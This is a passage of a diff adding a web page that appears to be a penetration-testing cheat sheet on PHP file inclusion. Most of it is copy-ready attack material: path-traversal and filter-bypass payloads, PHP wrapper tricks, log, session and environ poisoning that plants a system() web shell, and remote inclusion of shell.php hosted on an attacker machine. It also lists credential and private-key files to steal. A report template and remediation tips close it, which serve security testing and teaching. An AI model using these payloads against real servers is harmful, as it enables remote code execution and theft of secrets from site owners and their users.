+let res = copyTextToClipboard(`# Null byte — bypass appended extension (PHP < 5.3.4)\n?file=../../../../etc/passwd%00\n?file=../../../../etc/passwd%00.png\n\n# URL encoding\n?file=..%2F..%2F..%2Fetc%2Fpasswd\n?file=..%252F..%252Fetc%252Fpasswd    # double encoded\n\n# Path truncation (older PHP)\n?file=../../../../etc/passwd.................   # truncate appended extension\n\n# Filter bypass — if ../ is stripped\n?file=....//....//....//etc/passwd     # strips to ../\n?file=..././..././etc/passwd           # alternate separators\n\n# Absolute path (if no prefix added)\n?file=/etc/passwd\n`);copyBtnbtn_bf0bab7c59fe4246a94d8f3c589bf08c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bf0bab7c59fe4246a94d8f3c589bf08c.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Null byte &#8212; bypass appended extension (PHP &lt; 5.3.4)
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../etc/passwd%00
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../etc/passwd%00.png
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">URL encoding
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=..%2F..%2F..%2Fetc%2Fpasswd
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=..%252F..%252Fetc%252Fpasswd    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">double encoded
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Path truncation (older PHP)
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../etc/passwd.................   <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">truncate appended extension
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Filter bypass &#8212; if ../ is stripped
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=....//....//....//etc/passwd     <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">strips to ../
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=..././..././etc/passwd           <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">alternate separators
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Absolute path (if no prefix added)
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=/etc/passwd
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgb16291e" class="outline-3">
+<h3 id="orgb16291e">PHP Wrappers</h3>
+<div class="outline-text-3" id="text-orgb16291e">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d50fdbc63b5647288c48a4ecee8dff70>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_d50fdbc63b5647288c48a4ecee8dff70=document.querySelector('button[name=btn_d50fdbc63b5647288c48a4ecee8dff70]');
+copyBtnbtn_d50fdbc63b5647288c48a4ecee8dff70.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Read file source as base64 — bypasses output filters\n?file=php://filter/convert.base64-encode/resource=/etc/passwd\n?file=php://filter/convert.base64-encode/resource=index.php\n# Decode: echo \"<base64>\" | base64 -d\n\n# Execute arbitrary PHP from POST body\n?file=php://input\n# POST body: <?php system($_GET['cmd']); ?>\n\n# Embed and execute PHP directly in URL\n?file=data://text/plain,<?php system('id'); ?>\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n\n# Zip wrapper (if file upload exists)\n# Upload zip containing shell.php, then:\n?file=zip://uploads/file.zip#shell\n`);copyBtnbtn_d50fdbc63b5647288c48a4ecee8dff70.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d50fdbc63b5647288c48a4ecee8dff70.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Read file source as base64 &#8212; bypasses output filters
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=php://filter/convert.base64-encode/resource=/etc/passwd
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=php://filter/convert.base64-encode/resource=index.php
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Decode: echo "&lt;base64&gt;" | base64 -d
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Execute arbitrary PHP from POST body
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=php://input
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">POST body: &lt;?php system($_GET['cmd']); ?&gt;
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Embed and execute PHP directly in URL
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=data://text/plain,&lt;?php system(<span style="color: var(--clr-string); background-color: var(--bg-string);">'id'</span>); ?&gt;
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Zip wrapper (if file upload exists)
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Upload zip containing shell.php, then:
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=zip://uploads/file.zip#shell
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org22ef9fa" class="outline-2">
+<h2 id="org22ef9fa">3. LFI to RCE</h2>
+<div class="outline-text-2" id="text-org22ef9fa">
+</div>
+<div id="outline-container-orgaa59af8" class="outline-3">
+<h3 id="orgaa59af8">Log Poisoning — Apache / Nginx</h3>
+<div class="outline-text-3" id="text-orgaa59af8">
+<p>
+Inject PHP into a log file via User-Agent or URL, then include
+the log file via LFI.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a0e782c141c7412d8b6c62703d82c748>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_a0e782c141c7412d8b6c62703d82c748=document.querySelector('button[name=btn_a0e782c141c7412d8b6c62703d82c748]');
+copyBtnbtn_a0e782c141c7412d8b6c62703d82c748.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Step 1 — inject PHP into access log via User-Agent\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$TARGET/\n\n# Step 2 — include the log file\n?file=../../../../var/log/apache2/access.log&cmd=id\n?file=../../../../var/log/nginx/access.log&cmd=id\n\n# Alternative — inject via URL (appears in log as 404)\ncurl http://$TARGET/<?php system(\\$_GET['cmd']); ?>\n\n# Common log locations\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n/proc/self/fd/1                        # stdin — current process\n`);copyBtnbtn_a0e782c141c7412d8b6c62703d82c748.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a0e782c141c7412d8b6c62703d82c748.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Step 1 &#8212; inject PHP into access log via User-Agent
+</span>curl -A <span style="color: var(--clr-string); background-color: var(--bg-string);">"&lt;?php system(\$_GET['cmd']); ?&gt;"</span> http://$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">TARGET</span>/
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Step 2 &#8212; include the log file
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../var/log/apache2/access.log&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../var/log/nginx/access.log&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Alternative &#8212; inject via URL (appears in log as 404)
+</span>curl http://$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">TARGET</span>/&lt;?php system(<span style="color: var(--clr-string); background-color: var(--bg-string);">\$</span><span style="color: var(--clr-variable); background-color: var(--bg-variable);">_GET</span>[<span style="color: var(--clr-string); background-color: var(--bg-string);">'cmd'</span>]); ?&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Common log locations
+</span>/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/proc/self/fd/1                        <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">stdin &#8212; current process</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgb0007ca" class="outline-3">
+<h3 id="orgb0007ca">Log Poisoning — SSH Auth Log</h3>
+<div class="outline-text-3" id="text-orgb0007ca">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_709adc90f5a24e56beb1d0a3192656ff>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_709adc90f5a24e56beb1d0a3192656ff=document.querySelector('button[name=btn_709adc90f5a24e56beb1d0a3192656ff]');
+copyBtnbtn_709adc90f5a24e56beb1d0a3192656ff.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Inject PHP as SSH username — generates auth log entry\nssh '<?php system($_GET[\"cmd\"]); ?>'@$TARGET\n\n# Include SSH auth log\n?file=../../../../var/log/auth.log&cmd=id\n?file=../../../../var/log/secure&cmd=id    # RHEL/CentOS\n`);copyBtnbtn_709adc90f5a24e56beb1d0a3192656ff.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_709adc90f5a24e56beb1d0a3192656ff.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Inject PHP as SSH username &#8212; generates auth log entry
+</span>ssh <span style="color: var(--clr-string); background-color: var(--bg-string);">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>@$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">TARGET</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Include SSH auth log
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../var/log/auth.log&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../var/log/secure&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">RHEL/CentOS</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgf2d09b8" class="outline-3">
+<h3 id="orgf2d09b8">/proc/self/environ</h3>
+<div class="outline-text-3" id="text-orgf2d09b8">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2a0cc25b832a45e19fa782bf69915219>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_2a0cc25b832a45e19fa782bf69915219=document.querySelector('button[name=btn_2a0cc25b832a45e19fa782bf69915219]');
+copyBtnbtn_2a0cc25b832a45e19fa782bf69915219.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Inject into User-Agent — appears in process environment\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$TARGET/\n\n# Include proc environ\n?file=../../../../proc/self/environ&cmd=id\n`);copyBtnbtn_2a0cc25b832a45e19fa782bf69915219.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2a0cc25b832a45e19fa782bf69915219.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Inject into User-Agent &#8212; appears in process environment
+</span>curl -A <span style="color: var(--clr-string); background-color: var(--bg-string);">"&lt;?php system(\$_GET['cmd']); ?&gt;"</span> http://$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">TARGET</span>/
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Include proc environ
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../proc/self/environ&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org14e9e15" class="outline-3">
+<h3 id="org14e9e15">PHP Session Poisoning</h3>
+<div class="outline-text-3" id="text-org14e9e15">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b4ac3cacf843429dbe3439731d89b812>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_b4ac3cacf843429dbe3439731d89b812=document.querySelector('button[name=btn_b4ac3cacf843429dbe3439731d89b812]');
+copyBtnbtn_b4ac3cacf843429dbe3439731d89b812.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Step 1 — inject PHP into a session value via application input\n# (register/login with PHP payload as username)\n# Username: <?php system($_GET['cmd']); ?>\n\n# Step 2 — find the session file and include it\n?file=../../../../tmp/sess_<session_id>&cmd=id\n?file=../../../../var/lib/php/sessions/sess_<session_id>&cmd=id\n\n# Get session ID from browser cookies (PHPSESSID)\n`);copyBtnbtn_b4ac3cacf843429dbe3439731d89b812.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b4ac3cacf843429dbe3439731d89b812.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Step 1 &#8212; inject PHP into a session value via application input
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">(register/login with PHP payload as username)
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Username: &lt;?php system($_GET['cmd']); ?&gt;
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Step 2 &#8212; find the session file and include it
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../tmp/sess_&lt;session_id&gt;&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../var/lib/php/sessions/sess_&lt;session_id&gt;&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Get session ID from browser cookies (PHPSESSID)</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org4f16c52" class="outline-3">
+<h3 id="org4f16c52">php://input</h3>
+<div class="outline-text-3" id="text-org4f16c52">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_32726c3b886b462e87b0108ec4a1e67e>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_32726c3b886b462e87b0108ec4a1e67e=document.querySelector('button[name=btn_32726c3b886b462e87b0108ec4a1e67e]');
+copyBtnbtn_32726c3b886b462e87b0108ec4a1e67e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Send PHP payload in POST body, include via php://input\ncurl -X POST \"http://$TARGET/page.php?file=php://input&cmd=id\" \\\n  -d \"<?php system(\\$_GET['cmd']); ?>\"\n`);copyBtnbtn_32726c3b886b462e87b0108ec4a1e67e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_32726c3b886b462e87b0108ec4a1e67e.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Send PHP payload in POST body, include via php://input
+</span>curl -X POST <span style="color: var(--clr-string); background-color: var(--bg-string);">"http://$TARGET/page.php?file=php://input&amp;cmd=id"</span> <span style="color: #2fafff;">\</span>
+  -d <span style="color: var(--clr-string); background-color: var(--bg-string);">"&lt;?php system(\$_GET['cmd']); ?&gt;"</span>
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-orgf35a2fb" class="outline-2">
+<h2 id="orgf35a2fb">4. Remote File Inclusion (RFI)</h2>
+<div class="outline-text-2" id="text-orgf35a2fb">
+<p>
+Requires <code>allow_url_include = On</code> in <code>php.ini</code> — less common on
+modern servers but worth testing.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ce53c93e88dc4a9eb714d7f29fc0f06e>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_ce53c93e88dc4a9eb714d7f29fc0f06e=document.querySelector('button[name=btn_ce53c93e88dc4a9eb714d7f29fc0f06e]');
+copyBtnbtn_ce53c93e88dc4a9eb714d7f29fc0f06e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Host malicious PHP file on attacker\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\npython3 -m http.server 8080\n\n# Include from target\n?file=http://$ATTACKER:8080/shell.php&cmd=id\n\n# HTTPS (if HTTP blocked)\n?file=https://$ATTACKER/shell.php&cmd=id\n\n# SMB (Windows targets)\n?file=\\\\$ATTACKER\\share\\shell.php\n`);copyBtnbtn_ce53c93e88dc4a9eb714d7f29fc0f06e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ce53c93e88dc4a9eb714d7f29fc0f06e.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Host malicious PHP file on attacker
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> &gt; shell.php
+python3 -m http.server 8080
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Include from target
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=http://$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">ATTACKER</span>:8080/shell.php&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">HTTPS (if HTTP blocked)
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=https://$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">ATTACKER</span>/shell.php&amp;<span style="color: var(--clr-variable); background-color: var(--bg-variable);">cmd</span>=id
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">SMB (Windows targets)
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=<span style="color: var(--clr-string); background-color: var(--bg-string);">\\</span>$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">ATTACKER</span>\share\shell.php
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orga435af8" class="outline-2">
+<h2 id="orga435af8">5. High-Value Files to Read</h2>
+<div class="outline-text-2" id="text-orga435af8">
+</div>
+<div id="outline-container-org5c8689e" class="outline-3">
+<h3 id="org5c8689e">Linux</h3>
+<div class="outline-text-3" id="text-org5c8689e">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_d9e5c3bf22cf4fdfb83b46bc651544ca>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_d9e5c3bf22cf4fdfb83b46bc651544ca=document.querySelector('button[name=btn_d9e5c3bf22cf4fdfb83b46bc651544ca]');
+copyBtnbtn_d9e5c3bf22cf4fdfb83b46bc651544ca.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`/etc/passwd                   # user accounts\n/etc/shadow                   # password hashes (needs root)\n/etc/hosts                    # internal hostnames\n/etc/hostname                 # machine name\n/etc/ssh/sshd_config          # SSH config\n/home/<user>/.ssh/id_rsa      # private SSH keys\n/var/www/html/config.php      # DB credentials\n/var/www/html/.env            # environment variables / secrets\n/proc/version                 # kernel version\n/proc/self/environ            # process environment variables\n/proc/self/cmdline            # current process command\n`);copyBtnbtn_d9e5c3bf22cf4fdfb83b46bc651544ca.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d9e5c3bf22cf4fdfb83b46bc651544ca.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">/etc/passwd                   # user accounts
+/etc/shadow                   # password hashes (needs root)
+/etc/hosts                    # internal hostnames
+/etc/hostname                 # machine name
+/etc/ssh/sshd_config          # SSH config
+/home/&lt;user&gt;/.ssh/id_rsa      # private SSH keys
+/var/www/html/config.php      # DB credentials
+/var/www/html/.env            # environment variables / secrets
+/proc/version                 # kernel version
+/proc/self/environ            # process environment variables
+/proc/self/cmdline            # current process command
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org641dba7" class="outline-3">
+<h3 id="org641dba7">Windows</h3>
+<div class="outline-text-3" id="text-org641dba7">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_e9f77b5e7237401ea1e27c6a5ff9623a>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_e9f77b5e7237401ea1e27c6a5ff9623a=document.querySelector('button[name=btn_e9f77b5e7237401ea1e27c6a5ff9623a]');
+copyBtnbtn_e9f77b5e7237401ea1e27c6a5ff9623a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`C:\\Windows\\win.ini\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\inetpub\\wwwroot\\web.config      # DB connection strings, secrets\nC:\\xampp\\apache\\conf\\httpd.conf    # XAMPP config\nC:\\xampp\\php\\php.ini               # PHP config\nC:\\xampp\\phpMyAdmin\\config.inc.php # phpMyAdmin credentials\nC:\\Users\\<user>\\.ssh\\id_rsa        # SSH keys\n`);copyBtnbtn_e9f77b5e7237401ea1e27c6a5ff9623a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e9f77b5e7237401ea1e27c6a5ff9623a.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\inetpub\wwwroot\web.config      # DB connection strings, secrets
+C:\xampp\apache\conf\httpd.conf    # XAMPP config
+C:\xampp\php\php.ini               # PHP config
+C:\xampp\phpMyAdmin\config.inc.php # phpMyAdmin credentials
+C:\Users\&lt;user&gt;\.ssh\id_rsa        # SSH keys
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org060c30d" class="outline-2">
+<h2 id="org060c30d">6. Testing Methodology</h2>
+<div class="outline-text-2" id="text-org060c30d">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_58977be450c24143bfdc73f3a579e3db>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_58977be450c24143bfdc73f3a579e3db=document.querySelector('button[name=btn_58977be450c24143bfdc73f3a579e3db]');
+copyBtnbtn_58977be450c24143bfdc73f3a579e3db.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Identify parameters that appear to load content (page=, file=, template=)\n2. Test basic LFI: ../../../../etc/passwd\n3. If blocked: work through bypass list (null byte, encoding, filter tricks)\n4. If PHP: try php://filter to read source of app files\n5. Test log poisoning: inject User-Agent → include log file\n6. If LFI confirmed: escalate to RCE via one of the chains above\n7. If RFI: host shell.php and test include\n8. Document each step with request/response for report\n`);copyBtnbtn_58977be450c24143bfdc73f3a579e3db.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_58977be450c24143bfdc73f3a579e3db.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">1. Identify parameters that appear to load content (page=, file=, template=)
+2. Test basic LFI: ../../../../etc/passwd
+3. If blocked: work through bypass list (null byte, encoding, filter tricks)
+4. If PHP: try php://filter to read source of app files
+5. Test log poisoning: inject User-Agent &#8594; include log file
+6. If LFI confirmed: escalate to RCE via one of the chains above
+7. If RFI: host shell.php and test include
+8. Document each step with request/response for report
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org755866e" class="outline-2">
+<h2 id="org755866e">7. Reporting Template</h2>
+<div class="outline-text-2" id="text-org755866e">
+<p>
+<b>Classification:</b> File Inclusion (LFI / RFI)
+</p>
+
+<p>
+<b>Severity:</b> Critical (RCE achieved) / High (sensitive file read)
+</p>
+
+<p>
+<b>Description:</b>
+The <code>file</code> parameter at <code>[endpoint]</code> includes server-side files
+based on user-supplied input without path validation. An attacker
+can read arbitrary files from the server and, via log poisoning,
+achieve Remote Code Execution under the web server account.
+</p>
+
+<p>
+<b>Evidence:</b>
+</p>
+<pre class="example" id="org816f9fd">
+# Step 1 — LFI confirmed
+GET /page.php?file=../../../../etc/passwd HTTP/1.1
+→ root:x:0:0:root:/root:/bin/bash ...
+
+# Step 2 — Log poisoned via User-Agent
+GET / HTTP/1.1
+User-Agent: &lt;?php system($_GET['cmd']); ?&gt;
+
+# Step 3 — RCE via log inclusion
+GET /page.php?file=../../../../var/log/apache2/access.log&amp;cmd=id
+→ uid=33(www-data) gid=33(www-data)
+</pre>
+
+<p>
+<b>Remediation:</b>
+</p>
+<ul class="org-ul">
+<li>Never pass user input directly to file include functions</li>
+<li>Implement an allowlist of permitted file names</li>
+<li>Disable <code>allow_url_include</code> in <code>php.ini</code></li>
+<li>Run the web server under a least-privilege account</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org97b5f05" class="outline-2">
+<h2 id="org97b5f05">Tips</h2>
+<div class="outline-text-2" id="text-org97b5f05">
+<ul class="org-ul">
+<li>Always try <code>php://filter</code> before log poisoning — it is cleaner,
+requires no log write, and gives you source code of the app</li>
+<li>Log poisoning requires the log to be readable by the web server
+process — <code>/var/log/apache2/</code> is typically owned by www-data</li>
+<li>The User-Agent approach to log poisoning is the most reliable
+— every request gets logged, no special conditions needed</li>
+<li>On Windows targets web.config is the equivalent high-value file
+to <code>.env</code> on Linux — contains database connection strings</li>
+<li>If null byte bypass is needed the target is likely running very
+old PHP — also check for other low-hanging vulnerabilities</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script type="text/javascript">
